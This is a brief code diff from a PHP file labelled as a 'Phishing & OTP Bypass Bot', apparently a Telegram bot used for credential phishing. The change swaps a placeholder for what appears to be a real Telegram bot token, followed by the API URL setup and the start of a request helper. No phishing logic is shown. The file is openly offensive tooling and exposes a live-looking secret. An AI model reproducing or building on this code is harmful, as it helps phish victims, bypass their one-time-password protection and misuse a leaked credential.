@@ -3,7 +3,7 @@
  * R8rAIHAN Phishing & OTP Bypass Bot v3.0
  */
 
-$botToken = "YOUR_BOT_TOKEN_HERE"; // আপনার বটের টোকেন দিন
+$botToken = "8206530659:AAG2iqaLZzKBE5FaU5bGsiis65YXwcLPYRo"; // আপনার বটের টোকেন দিন
 $api = "https://api.telegram.org/bot$botToken";
 
 function tg($method, $data) {
